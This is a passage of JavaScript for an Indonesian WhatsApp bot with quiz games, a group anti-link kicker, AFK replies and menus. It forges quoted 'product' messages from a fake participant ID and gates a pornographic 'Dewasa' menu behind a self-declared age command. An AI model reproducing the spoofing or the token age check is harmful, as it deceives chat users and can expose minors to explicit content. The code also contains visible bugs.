        const ftoko = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./media/foto/thumb.jpg`)},"title": `© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ`,"description": "Ramdani Official", "currencyCode": "IDR","priceAmount1000": "999999","retailerId": "Ramdani Official","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}

      // Anti link
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                freply(`*「 GROUP LINK DETECTOR 」*\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                Ramdani.groupRemove(from, [sender])
            }
        }
        
        
let {
    BanChats,
} = setting

function banChat() {
    if (banChats == true) {
        return false
    } else {
        return true
    }
}
        
        // SEWA TIME
             _sewa.expiredCheck(Ramdani, sewa)
             
        // MUTE
             if (isMuted){
             if (!isGroupAdmins && !isPremium) return
 }
            
              const getWin = (userId) => {
              let position = false
              Object.keys(_win).forEach((i) => {
              if (_win[i].jid === userId) {
              position = i
       }
        })
              if (position !== false) {
              return _win[position].win
            }
        }
      // GAME 
             game.cekWaktuFam(Ramdani, family100)
          
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var http = randomNomor(100)
                    atm.addKoinUser(sender, http, _uang)
                    await freply(`*_🎮 Tebak Gambar  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${http} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                }
            }
        if (game.isfam(from, family100)) {
            var anjuy = game.getjawaban100(from, family100)
            for (let i of anjuy){
                if (budy.toLowerCase().includes(i)){
                    var htgmp = Math.floor(Math.random() * 20) + 1
                    atm.addKoinUser(sender, htgmp, _uang)
                    await freply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
                    var anug = anjuy.indexOf(i)
                    anjuy.splice(anug, 1)
                }
            }
            if (anjuy.length < 1){
                Ramdani.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
                family100.splice(game.getfamposi(from, family100), 1)
            }
       }
            if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakanime[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmu = randomNomor(100)
                    atm.addKoinUser(sender, htgmu, _uang)
                    await freply(`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)
                    delete tebakanime[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                }
            }
            if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklagu[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpl = randomNomor(100)
                    atm.addKoinUser(sender, htpl, _uang)
                    await freply(`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)
                    delete tebaklagu[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                }
            }
            if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaktebakan[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htpu = randomNomor(100)
                    atm.addKoinUser(sender, htpu, _uang)
                    await freply(`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)
                    delete tebaktebakan[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))                    
                }
            }
            if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = kuismath[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htcc = randomNomor(100)
                    atm.addKoinUser(sender, htcc, _uang)
                    await freply(`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)
                    delete kuismath[sender.split('@')[0]]
                    fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                }
            }
          if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = asahotak[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgm = randomNomor(100)
                    atm.addKoinUser(sender, htgm, _uang)
                    await freply(`*_🎮 Asah Otak  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgm} 💰_\n\nIngin bermain lagi? kirim *${prefix}asahotak*`)
                    delete asahotak[sender.split('@')[0]]
                    fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                }
            }
          if (caklontong.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = caklontong[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmi = randomNomor(100)
                    atm.addKoinUser(sender, htgmi, _uang)
                    await freply(`*_🎮 Caklontong  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmi} 💰_\n\nIngin bermain lagi? kirim *${prefix}caklontong*`)
                    delete caklontong[sender.split('@')[0]]
                    fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                }
            }
          if (tebakjenaka.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakjenaka[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmuu = randomNomor(100)
                    atm.addKoinUser(sender, htgmuu, _uang)
                    await freply(`*_🎮 Tebak Jenaka  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmuu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakjenaka*`)
                    delete tebakjenaka[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                }
            }
            if (tebaklirik.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaklirik[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmii = randomNomor(100)
                    atm.addKoinUser(sender, htgmii, _uang)
                    await freply(`*_🎮 Tebak Lirik 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmii} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklirik*`)
                    delete tebaklirik[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                }
            }
            if (tebakkimia.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakkimia[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmcc = randomNomor(100)
                    atm.addKoinUser(sender, htgmcc, _uang)
                    await freply(`*_🎮 Tebak Kimia 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkimia*`)
                    delete tebakkimia[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakkimia.json", JSON.stringify(tebakkimia))
                }
            }
          if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebaksiapaaku[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htgmk = randomNomor(100)
                    atm.addKoinUser(sender, htgmk, _uang)
                    await freply(`*_🎮 Tebak Siapakah Aku  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmk} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaksiapaaku*`)
                    delete tebaksiapaaku[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                }
            }
          if (tebakbendera.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakbendera[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var html = randomNomor(100)
                    atm.addKoinUser(sender, html, _uang)
                    await freply(`*_🎮 Tebak Bendera  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${html} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakbendera*`)
                    delete tebakbendera[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                }
            }
          if (susunkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = susunkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmp = randomNomor(100)
                    atm.addKoinUser(sender, htmp, _uang)
                    await freply(`*_🎮 Susun Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmp} 💰_\n\nIngin bermain lagi? kirim *${prefix}susunkata*`)
                    delete susunkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                }
            }
          if (tebakkata.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakkata[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                	var htmu = randomNomor(100)
                    atm.addKoinUser(sender, htmu, _uang)
                    await freply(`*_🎮 Tebak Kata  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakkata*`)
                    delete tebakkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakkata.json", JSON.stringify(tebakkata))
                }
            }
// AFK
	if (isGroup) {
		if (!mek.key.fromMe && mek.key.fromMe) return
		for (let x of mentionUser) {
		    if (afk.checkAfkUser(x, _afk)) {
			const getId = afk.getAfkId(x, _afk)
			const getReason = afk.getAfkReason(getId, _afk)
			const getTime = afk.getAfkTime(getId, _afk)
			const cptl = `*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan diganggu!*
➸ *Alasan*  : ${getReason}
➸ *Sejak* : ${getTime}`
      mentions(cptl, x, true)
    }}
		if (afk.checkAfkUser(sender, _afk) && !isCmd) {
		    const getTime = afk.getAfkTime(sender, _afk)
		    const getReason = afk.getAfkReason(sender, _afk)
		    const ittung = ms(await Date.now() - getTime)
		    const pep = `*${pushname}* telah kembali dari AFK! Selamat datang kembali~`
		    freply(pep)
		    _afk.splice(afk.getAfkPosition(sender, _afk), 1)
		    fs.writeFileSync('./database/user/afk.json', JSON.stringify(_afk))
		}
	    }
		const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
ramdani = await Ramdani.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: ramdani.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Ramdani.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const sendButLocation = async(id, text1, desc1, gam1, but = [], options = {}) => {
               let kma = gam1
               Ramdani.sendMessage(id, {"contentText": text1,
               "footerText": desc1, 
               "buttons": but,
               "headerType": "LOCATION",
                       "locationMessage": {
                   "text": "BOT",
                   "name": "South Brisbane",
                   "address": "Cloudflare, Inc",
                   "jpegThumbnail": fs.readFileSync('./media/foto/thumb.jpg')
                }}, MessageType.buttonsMessage, {quoted: mek, contextInfo:{mentionedJid: parseMention(text1, desc1)}}, options)  
              }          
      
      const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      Ramdani.sendMessage(id, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
    };
        // Auto Read
        Ramdani.chatRead(from, "read")
        //auto vn 
        await Ramdani.updatePresence(from, Presence.recording)

       // CMD
        if (isCmd && !isGroup)
		    atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ CP ]'), color(time, 'aqua'), color(`${command} [${args.length}]`), 'pesan dari', color(pushname))
        
        if (isCmd && isGroup)
            atm.addKoinUser(sender, randomNomor(20), _uang)
            console.log(color('[ GC ]'), color(time, 'aqua'), color(`${command} [${args.length}]`), 'pesan dari', color(pushname), 'in', color(groupName))
  //Buat fake info bot
//DI UBAH YATIM
danzrun = process.uptime() 
           Ramdani.setStatus(`${namabot} Aktif Selama ${(danzrun)} © Creator By Ramdani Official`).catch((_)=>_); //DI UBAH YATIMM
          settingstatus = new Date() * 1;
const jmn = moment.tz('Asia/Jakarta').format('HH.mm')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
const fakeText = (teks) => {
Ramdani.sendMessage(from, teks, text, {quoted: troli})
}          

            switch(command){
            	case 'verify':
	            case 'daftar':
	            if (isBanned) return freply(mess.banned)
	            freply(mess.waitregist)
				const serials = addSerial(20)
				try {
				ppimg = await Ramdani.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				imglu = 'https://mekpa-result.herokuapp.com/bgverify.jpeg'
				veri = sender
				fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
				addRegist(sender, serials)
				const ramdaniganteng = 
`
─── 「 *REGISTERED SUCCESS* 」───
• NAMA : ${pushname}
• NOMOR : ${sender.split('@')[0]}
• SERI : ${serials}
• TANGGAL : ${Tanggal}
• PUKUL : ${jam}
`
                let buff = await getBuffer(`${ppimg}`)                
                Ramdani.sendMessage(from, buff, MessageType.image, {quoted: mek, caption: ramdaniganteng, contextInfo: {'mentionedJid': [sender]}})
                break
//DEWASA
    case 'saya18':
	case 'my18':
	if (!isRegist) return freply(mess.regist)
    if (isBanned) return freply(mess.banned)
    freply(mess.wait)
				const serimek = addSerimek(20)
				try {
				ppimg = await Ramdani.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				imglu = 'https://mekpa-result.herokuapp.com/bgverify.jpeg'
				veri = sender
				fs.writeFileSync('./database/dewasa.json', JSON.stringify(dewasa))
				addDewasa(sender, serimek)
				const ramdanigans = 
`
─── 「 *VERIFY SUCCESS* 」───
• NAMA : ${pushname}
• NOMOR : ${sender.split('@')[0]}
• SERI : ${serimek}
• USIA : 18 tahun
• TANGGAL : ${Tanggal}
• PUKUL : ${jam}
`
                let buffmek = await getBuffer(`${ppimg}`)                
                Ramdani.sendMessage(from, buffmek, MessageType.image, {quoted: mek, caption: ramdanigans, contextInfo: {'mentionedJid': [sender]}})
                break
//BOCIL
case 'my11':
case 'my12':
case 'my13':
case 'my14':
case 'my15':
case 'my16':
case 'my17':
//
case 'saya11':
case 'saya12':
case 'saya13':
case 'saya14':
case 'saya15':
case 'saya16':
case 'saya17':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`*SKIP LU MASIH BOCIL, MENDING MAIN EP EP:V*`)
break
           
       case 'donasi':
       if (!isRegist) return freply(mess.regist)
       if (isBanned) return freply(mess.banned)
               txtt =`*Hai Kak* ${pushname} *Yang Baik*\n*Mau donasi?* Dikasih Syukur, Gak jadi Gpp :)`

               buttons = [{buttonId: `${prefix}gopay`,buttonText:{displayText: 'GO-PAY'},type:1},{buttonId: `${prefix}dana`,buttonText:{displayText: 'DANA'},type:1},{buttonId: `${prefix}qris`,buttonText:{displayText: 'QRIS ALL PAY'},type:1}]

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: 'Donasi Seiklas nya',
               buttons: buttons,
               headerType: 1
}

               prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{})
               Ramdani.relayWAMessage(prep)
               break 
        case 'owner':
        case 'ownerbot':
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
               sendKontak(from, `${nomorowner}`, `${namaowner}`, 'Sibukk!!')
               await sleep(1000)
               txtt =`*Hai Kak* ${pushname}\nItu Ownerku, Mau Ngpain Yaa?`

               buttons = [{buttonId: '!youtube',buttonText:{displayText: 'yσυтυвє'},type:1},{buttonId:'!infoig',buttonText:{displayText:'ıηsтαgяαм'},type:1}]

               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: 'Jangan Ganggu Owner Ku🗿',
               buttons: buttons,
               headerType: 1
}

               prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{})
               Ramdani.relayWAMessage(prep)
               break                     
//------------------------ < SUBSCRIBE RAMDANI OFFICIAL > ------------------------\\
        case 'menu':
        case 'help':
        case 'm':
        case 'h':
        case 'danzz':
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
        freply(mess.wait)
        menu =`*Hai Kak👋 ${pushname} ${ucapanWaktu}*

    『 *BOT INFO* 』

⛱ *Device* : xiaomi redmi 4A
🗺 *Wa Version* : 2.22.3.77
💬 *OS Version* : 10
🌐 *Platfrom* : android/pc
📳 *Mode* : > public mode <
☢ *Prefix* : > multi prefix <
🔋 *baterai bot* : ${baterai}
👨💻 *Name Creator* : Ramdani Official


       『 *USER INFO* 』
       
🏅 *Status* : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Free use'}
⏳ *Limit* : ${isPremium ? 'Unlimited' : `${limit}`}
🎎 *Nama* : ${pushname}
🎿 *Bio* : [object Object]
☎ *Nomor* : @${sender.split('@')[0]}
🔋 *Baterai* : ${batre}
⏰ *Waktu* : ${moment().utcOffset('+0700').format('HH:mm')}
📅 *Tanggal* : ${moment.tz('Asia/Jakarta').format('DD/MM')}
`
               buttons = [{buttonId: `${prefix}allmenu`,buttonText:{displayText: 'ᴀʟʟᴍᴇɴᴜ'},type:1},{buttonId: `${prefix}command`,buttonText:{displayText: 'sɪᴍᴘᴇʟ ᴍᴇɴᴜ'},type:1},{buttonId: `${prefix}rules`,buttonText:{displayText: 'ʀᴜʟᴇs'},type:1}]

               imageMsg = (await Ramdani.prepareMessageMedia(fs.readFileSync(`./media/foto/menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/foto/menu.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: 'ᴊɪᴋᴀ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ᴇʀʀᴏʀ sɪʟᴀʜᴋᴀɴ ᴋᴇʟɪᴋ .ᴀʟʟᴍᴇɴᴜ ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ\n© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: troli})
               Ramdani.relayWAMessage(prep)
               randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
               Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                break
        case 'allmenu':
        if (!isRegist) return freply(mess.regist)
        if (isBanned) return freply(mess.banned)
        freply(mess.wait)
        allmenu =`*hallo kak👋 ${pushname} ${ucapanWaktu}*
━━━━━ *INFO USER* ━━━━━
❏ NAMA : *${pushname}*
❏ API : *wa.me/${sender.split('@')[0]}*
❏ STATUS : *${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Free use'}*
❏ LIMIT : *${isPremium ? 'Unlimited' : `${limit}`}*

━━━━━ *INFO BOT* ━━━━━
❏ NAMA : *${namabot}*
❏ API : *wa.me/${botNumber}*
❏ OWNER : *${namaowner}*
❏ API : *wa.me/${nomorowner}*
❏ AKTIF : *${runtime(process.uptime())}*
❏ BATERAI : *${baterai}*
❏ PREFIX : *『> multi prefix <』*
❏ TOTAL FITUR : *400+*

   ━━━━━ *ALLMENU* ━━━━━

*⌜ Info Menu⌟*
> 1 ${prefix}update
> 2 ${prefix}level
> 3 ${prefix}rules
> 4 ${prefix}profile
> 5 ${prefix}waktu
> 6 ${prefix}botstat
> 7 ${prefix}sewabot
> 8 ${prefix}listsewa
> 9 ${prefix}owner
> 10 ${prefix}ping
> 11 ${prefix}runtime
> 12 ${prefix}donasi
> 13 ${prefix}leaderboard
> 14 ${prefix}cekpremium
> 15 ${prefix}listpremium
> 16 ${prefix}getpp
> 17 ${prefix}setpp
> 18 ${prefix}bugreport *keluhan*


*⌜ Group Menu ⌟*    
> 19 ${prefix}groupsetting
> 20 ${prefix}afk *alasan*
> 22 ${prefix}ceksewa
> 23 ${prefix}kickall
> 24 ${prefix}infogrup
> 25 ${prefix}promote
> 26 ${prefix}demote
> 27 ${prefix}listonline
> 28 ${prefix}tagall *teks*
> 29 ${prefix}leave
> 30 ${prefix}kick *reply*
> 31 ${prefix}add *+62xxxxxx*
> 32 ${prefix}setnamegc
> 33 ${prefix}setppgc
> 34 ${prefix}setdeskgc
> 35 ${prefix}sider *reply chat bot*
> 36 ${prefix}hidetag *teks/reply teks*
> 37 ${prefix}linkgc


*⌜ Game Menu ⌟* 
> 38 ${prefix}limitgame
> 39 ${prefix}slot
> 40 ${prefix}gelud *@tag*
> 41 ${prefix}tictactoe *@tag*
> 42 ${prefix}siapaaku
> 43 ${prefix}family100
> 44 ${prefix}kuismath
> 45 ${prefix}asahotak
> 46 ${prefix}tebaklirik
> 47 ${prefix}tebaklagu
> 48 ${prefix}tebakkata
> 49 ${prefix}susunkata
> 50 ${prefix}kimiakuis
> 51 ${prefix}caklontong
> 52 ${prefix}tebakjenaka
> 53 ${prefix}tebakanime
> 54 ${prefix}tebaktebakan
> 55 ${prefix}tebakgambar
> 56 ${prefix}tebakumur
> 57 ${prefix}tebakbendera
> 58 ${prefix}suit *batu/kertas/gunting*
> 59 ${prefix}math


*⌜ Islam Menu ⌟*  
> 60 ${prefix}ngaji1
> 61 ${prefix}ngaji2
> 62 ${prefix}sholawat nabi
> 63 ${prefix}kisahnabi
> 64 ${prefix}jadwalsholat
> 65 ${prefix}alquran
> 66 ${prefix}asmaulhusna
> 67 ${prefix}alquranaudio
> 68 ${prefix}listsurah


*⌜ Download Menu ⌟*
> 69 ${prefix}fbdl 
> 70 ${prefix}igdl 
> 71 ${prefix}igdl2 
> 72 ${prefix}twitter 
> 73 ${prefix}tiktok 
> 74 ${prefix}play 
> 75 ${prefix}ythd 
> 76 ${prefix}ytmp3 
> 77 ${prefix}ytmp4 
> 78 ${prefix }soundcloud 
> 79 ${prefix}tiktoknowm 
> 80 ${prefix}tiktokaudio
> 81 ${prefix}mediafire 
> 82 ${prefix}nhentaipdf *code*


*⌜ Maker Menu ⌟*
> 83 ${prefix}blackpink 
> 84 ${prefix}halloween 
> 85 ${prefix}3dgradient
> 86 ${prefix}naturalleaves 
> 87 ${prefix}dropwater 
> 88 ${prefix}blood 
> 89 ${prefix}blood2 
> 90 ${prefix}neondevil 
> 91 ${prefix}neon 
> 92 ${prefix}neonlight 
> 93 ${prefix}neonlight2 
> 94 ${prefix}neonlight3 
> 95 ${prefix}greenneon 
> 96 ${prefix}toxic 
> 97 ${prefix}matrix 
> 98 ${prefix}thunder 
> 99 ${prefix}thunder2 
> 100 ${prefix}bokeh 
> 101 ${prefix}carbontext 
> 102 ${prefix}christmas 
> 103 ${prefix}breakwall 
> 104 ${prefix}roadwarning 
> 105 ${prefix}engraved3d 
> 106 ${prefix}embossed 
> 107 ${prefix}writefoggy 
> 108 ${prefix}3dstone 
> 110 ${prefix}futuristic 
> 111 ${prefix}asketch 
> 112 ${prefix}bluecircuit
> 113 ${prefix}space 
> 114 ${prefix}amagmahot
> 115 ${prefix}artpapercut 
> 116 ${prefix}3dluxurygold
> 117 ${prefix}robotr2d2 
> 118 ${prefix}harrypotter
> 119 ${prefix}glitch3
> 120 ${prefix}greenhorrorstyle
> 121 ${prefix}3ddeepseametal
> 122 ${prefix}leddisplayscreen 
> 123 ${prefix}wonderfulgraffitiart
> 124 ${prefix}8bit  
> 125 ${prefix}pornhub  
> 125 ${prefix}glitch  
> 126 ${prefix}glitch2  
> 127 ${prefix}layered  
> 128 ${prefix}3dsteel  
> 129 ${prefix}realistic  
> 130 ${prefix}lionlogo  
> 131 ${prefix}ninjalogo  
> 132 ${prefix}wolf  
> 133 ${prefix}wolf2  
> 134 ${prefix}halloween2  
> 135 ${prefix}marvel  
> 136 ${prefix}marvel2  
> 137 ${prefix}cinematichorror  
> 138 ${prefix}avengers  
> 139 ${prefix}graffiti3  
> 140 ${prefix}captainamerica  
> 141 ${prefix}girlneko  
> 142 ${prefix}sadboy  
> 143 ${prefix}kaneki  
> 144 ${prefix}rem  
> 145 ${prefix}lolimaker  
> 146 ${prefix}gura  


*⌜ Serti Menu ⌟*  
> 147 ${prefix}sertitolol 
> 148 ${prefix}bucinserti
> 149 ${prefix}fuckboy
> 150 ${prefix}fuckgirl
> 151 ${prefix}badboy
> 152 ${prefix}badgirl
> 153 ${prefix}goodboy
> 154 ${prefix}goodgirl


*⌜ Sticker Menu ⌟*
> 155 ${prefix}attp *teks*
> 156 ${prefix}ttp2 *teks*
> 157 ${prefix}ttp3 *teks*
> 158 ${prefix}ttp4 *teks*
> 159 ${prefix}amongus *teks*
> 160 ${prefix}dadu
> 161 ${prefix}doge
> 162 ${prefix}patrick
> 163 ${prefix}gura
> 164 ${prefix}stickeranime
> 165 ${prefix}semoji *emoji*
> 166 ${prefix}sticker *reply foto/video*
> 167 ${prefix}smeme *teks|teks*
> 168 ${prefix}swm *pack|author*
> 169 ${prefix}take *pack|author* 
> 170 ${prefix}tovideo *reply sgif*
> 171 ${prefix}toimg


*⌜ Sound Menu ⌟*
> 172 ${prefix}sound1
> 173 ${prefix}sound2
> 174 ${prefix}sound3
> 175 ${prefix}sound4
> 176 ${prefix}sound5
> 177 ${prefix}sound6
> 178 ${prefix}sound7
> 179 ${prefix}sound8
> 180 ${prefix}sound9
> 181 ${prefix}sound10
> 182 ${prefix}sound11
> 183 ${prefix}sound12
> 184 ${prefix}sound13
> 185 ${prefix}sound14
> 185 ${prefix}sound15
> 186 ${prefix}sound16
> 187 ${prefix}sound17
> 188 ${prefix}sound18
> 189 ${prefix}sound19
> 190 ${prefix}sound20
> 191 ${prefix}sound21
> 192 ${prefix}sound22
> 193 ${prefix}sound23
> 194 ${prefix}sound24
> 195 ${prefix}sound25
> 196 ${prefix}sound26
> 197 ${prefix}sound27
> 198 ${prefix}sound28
> 199 ${prefix}sound29
> 200 ${prefix}sound30
> 201 ${prefix}sound31
> 202 ${prefix}sound32
> 203 ${prefix}sound33
> 204 ${prefix}sound34
> 205 ${prefix}sound35
> 206 ${prefix}sound36
> 207 ${prefix}sound37
> 208 ${prefix}sound38
> 209 ${prefix}sound39
> 210 ${prefix}sound40
> 211 ${prefix}sound41
> 212 ${prefix}sound42
> 213 ${prefix}sound43
> 214 ${prefix}sound44
> 215 ${prefix}sound45
> 216 ${prefix}sound46
> 217 ${prefix}sound47
> 218 ${prefix}sound48
> 219 ${prefix}sound49
> 220 ${prefix}sound50


*⌜ Vn Menu ⌟*
> 221 ${prefix}tupai
> 222 ${prefix}robot
> 223 ${prefix}gemuk
> 224 ${prefix}bass
> 225 ${prefix}terbalik
> 226 ${prefix}tts
> 227 ${prefix}detikvn
> 228 ${prefix}detikvideo
> 229 ${prefix}toimg
> 230 ${prefix}tovideo
> 231 ${prefix}tomp3


*⌜ Status Menu ⌟*
> 232 ${prefix}upswteks *teks*
> 233 ${prefix}upswlokasi *teks*
> 234 ${prefix}upswvideo *video*
> 235 ${prefix}upswimage *image*
> 236 ${prefix}upswstiker *stiker*
> 237 ${prefix}upswvoice *voice*
> 238 ${prefix}upswaudio *audio*
> 239 ${prefix}upswgif *gif*


*⌜ Dewasa Menu ⌟*
> 240 ${prefix}xnxx *link*
> 241 ${prefix}xnxxsearch
> 242 ${prefix}asupan
> 243 ${prefix}randombokep
> 244 ${prefix}desah
> 245 ${prefix}desah1
> 246 ${prefix}desah2
> 247 ${prefix}desah3
> 248 ${prefix}desah4
> 249 ${prefix}desah5
> 250 ${prefix}desah6


*⌜ Other Menu ⌟*
> 251 ${prefix}brainly *query*
> 252 ${prefix}cerpen
> 253 ${prefix}shopee *product*
> 254 ${prefix}playstore *query*
> 255 ${prefix}ssweb *query*
> 256 ${prefix}google *query*
